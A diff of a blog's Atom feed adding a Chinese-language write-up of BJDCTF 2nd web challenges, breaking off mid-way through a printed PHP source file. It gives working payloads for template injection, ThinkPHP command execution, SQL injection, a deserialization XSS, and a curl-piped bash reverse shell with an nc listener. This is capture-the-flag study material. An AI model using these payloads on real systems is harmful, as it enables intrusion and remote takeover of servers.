@@ -5,9 +5,9 @@
   
   <link href="/atom.xml" rel="self"/>
   
-  <link href="https://ensuperb.gdpccsa.cn/"/>
-  <updated>2021-02-26T05:04:09.049Z</updated>
-  <id>https://ensuperb.gdpccsa.cn/</id>
+  <link href="https://ensuperb.github.io/"/>
+  <updated>2021-04-21T13:09:53.928Z</updated>
+  <id>https://ensuperb.github.io/</id>
   
   <author>
     <name>ENSUPERB</name>
@@ -17,9 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>BJDCTF 2nd Web</title>
+    <link href="https://ensuperb.github.io/posts/bjdctf-2nd-web/"/>
+    <id>https://ensuperb.github.io/posts/bjdctf-2nd-web/</id>
+    <published>2021-04-20T12:35:49.000Z</published>
+    <updated>2021-04-21T13:09:53.928Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="BJDCTF-2nd"><a href="#BJDCTF-2nd" class="headerlink" title="BJDCTF 2nd"></a>BJDCTF 2nd</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Fake-google"><a href="#Fake-google" class="headerlink" title="Fake google"></a>Fake google</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'cat /flag'</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c7c26058-4d64-<span class="number">4b02</span>-be14-c7aaad68e492.node3.buuoj.cn/?s=<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=cat /flag</span><br></pre></td></tr></table></figure><h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>强行让我学到了很多关于http的header。也理解为什么这个标题叫这个了，好活。</p><p>开始时以为是sql注入得到admin，实际上是登陆其他用户即可，抓包响应页面的最底下有个注释。(加粗部分为本题需使用的头)</p><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html,application/json</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td><strong>Cookie</strong></td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td><strong>Client-ip</strong></td><td>A common requirement is to access the real client address from the server.</td><td>Client-ip: 127.0.0.1</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td><strong>From</strong></td><td>发出请求的用户的Email</td><td>From: <a href="mailto:user@email.com">user@email.com</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td><strong>Referer</strong></td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives…</a></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td><strong>Upgrade</strong></td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td><strong>User-Agent</strong></td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td><strong>Via</strong></td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><p>扫描一遍网站，发现hint.txt。</p><p>发现过滤字符时，网站会alert一个stophacking。例如等号。</p><p>没有等号，可以试试网上的二分法求解。</p><p><code>password=or/**/length(database())&gt;0#&amp;username=admin\</code></p><p>判断成功，页面上出现xxx需要变得stronger。</p><p>判断无效，页面仍然是girlfriend。</p><h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><blockquote><p>知识点： git泄露、反序列化漏洞、XSS</p></blockquote><p>反序列化漏洞需要借助代码中的对象，由于泄露的代码中并没有对象，故而我们使用PHP内置的对象，类似于PWN的ROP。</p><p>7.0以上的版本可以用<code>Error</code>类，5.0或者7.0以上的可以用<code>Exception</code>类，因此<code>Exception</code>类更为适用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='https://github.com'&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"></span><br><span class="line">?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A58%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.location.href%<span class="number">3</span>D%<span class="number">27</span>https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fgithub.com%<span class="number">27</span>%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>string%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>本题在触发XSS后会在本在内的cookies显示flag。</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">【拓展】反序列化之PHP原生类的利用</a></p><h3 id="ElementMaster"><a href="#ElementMaster" class="headerlink" title="ElementMaster"></a>ElementMaster</h3><blockquote><p>知识点： 元素周期表、火眼金睛</p></blockquote><p>开始研究图片研究半天，看了下源码，源码有两个可疑id，直接给他上十六进制转字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">506F2E  Po.</span><br><span class="line">706870  php</span><br></pre></td></tr></table></figure><p>怀疑是不是自己整错了，<code>Po.</code> 能有什么坏心思呢？看了下别人的wp发现是没错的，而且这是元素周期表中的钋元素，好家伙，很结合主题。题目的意思是遍历一遍元素周期表。那我也顺便学学别人是怎么写的吧。虽然不知道原作者是谁，但是由衷感谢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://c411b4fc-2454-4132-99db-dea01c5835c9.node3.buuoj.cn/'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">element=[<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">        <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>,</span><br><span class="line">        <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>,</span><br><span class="line">        <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>,</span><br><span class="line">        <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>,</span><br><span class="line">        <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">        <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> element:</span><br><span class="line">        r=requests.get(url+i+<span class="string">'.php'</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                page+=r.text</span><br><span class="line">                <span class="keyword">print</span> (page)</span><br></pre></td></tr></table></figure><p>然后爆出一个路径，直接访问得到flag。</p><h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>开始时审查了元素，发现了<code>test.php</code>页面，按照里面的提示（I left some good for you in my admin passwd.）我不进行SQL注入，而是尝试一波常用密码找回（狗头）。</p><p>cookie中的<code>dXNlcg</code>变量解码后怀疑是时间戳。</p><p>cookie中的<code>dXNlcg</code>变量与<code>Forecast success rate</code>正比关系。</p><p>Burst successed! The passwd is av11664517@1583985203.</p><p>密码放上去一直是错，不过看到这个av开头的数值我第一想到时B站的视频，看评论找了很久。</p><p><img src="https://z3.ax1x.com/2021/04/21/cbMNq0.png" alt="image-20210419191518562"></p><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><blockquote><p>知识点： 代码泄露、反弹shell</p></blockquote><p>题目提示swp泄露了，给他点面子，进入<code>.index.php.swp</code>页面。下载后<code>vim -r index.php</code>打开。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了挺多东西的，而且没回显，我只能想到用<code>curl</code>来反弹shell。</p><p>在自己的公网机子里放入bash.txt，内容如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/you_ip/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后在自己机子里侦听<code>9999</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br></pre></td></tr></table></figure><p>在payload填充</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=curl+<span class="string">http:</span><span class="comment">//your_IP/bash.txt+|+bash</span></span><br></pre></td></tr></table></figure><p>最后用<code>find</code>来寻找真flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -name flag </span><br><span class="line">/etc/demo/P3rh4ps/love/you/flag</span><br></pre></td></tr></table></figure><p>拓展：</p><p><a href="https://ntwyc2018.github.io/2018/07/06/yuanma/" target="_blank" rel="noopener">文件源码泄漏大全</a></p><p><a href="https://www.secpulse.com/archives/124398.html" target="_blank" rel="noopener">常见的Web源码泄漏漏洞及其利用</a></p><h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测*"></a>文件探测*</h3><blockquote><p>知识点：robots、请求头、php伪协议、代码审计、格式化输出注入、session与cookie的关系、真伪随机数</p></blockquote><p>考点很多，这道题还是有点<strong>值得推荐</strong>的。</p><p>robots.txt</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agen<span class="variable">t:</span> *</span><br><span class="line">Disallo<span class="variable">w:</span> /flag.php</span><br><span class="line">Disallo<span class="variable">w:</span> /admin.php</span><br><span class="line">Allo<span class="variable">w:</span> /<span class="built_in">index</span>.php</span><br></pre></td></tr></table></figure><p>访问<code>admin.php</code>页面说是要本地访问，xff、client-ip什么的都没有用途，可能是用<code>remoteaddr</code>的，所以打算先放一下。</p><p>据说做BJD的题要一直开着F12，发现回显报文中有hint，指向了<code>home.php</code>。进入后指定定向<code>home.php?file=system</code>。</p><p>试了一下<code>file=index</code>，管理员骂骂咧咧地关闭了站点。（不是）发现回显多了个<code>.fxxkyou</code>不得不说出题人很素质，为避免伤了我们的心还打上了码。其他类似的我们尝试了<code>flag</code>会回显<code>not now</code>，<code>admin</code>会回显不是管理等等。</p><p>试过一段时间后想到有可能是文件包含，那可以试试伪协议，于是/home.php?file=php://filter/convert.base64-encode/resource=system，得到system的源码，home的也得到了，其他被home的业务逻辑限制了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// system.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ '</span>;</span><br><span class="line">$str3 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ '</span>;</span><br><span class="line">$str4 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ '</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/normalize.css"</span> /&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/demo.css"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/component.css"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=<span class="string">"js/modernizr.custom.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id="theForm" class="simform" autocomplete="off" action="system.php" method="post"&gt;</span><br><span class="line">        &lt;div class="simform-inner"&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;</span><br><span class="line">            &lt;ol class="questions"&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span class="string">"q1"</span>&gt;你知道目录下都有什么文件吗?&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q1"</span> name=<span class="string">"q1"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span class="string">"q2"</span>&gt;请输入你想检测文件内容长度的url&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q2"</span> name=<span class="string">"q2"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span 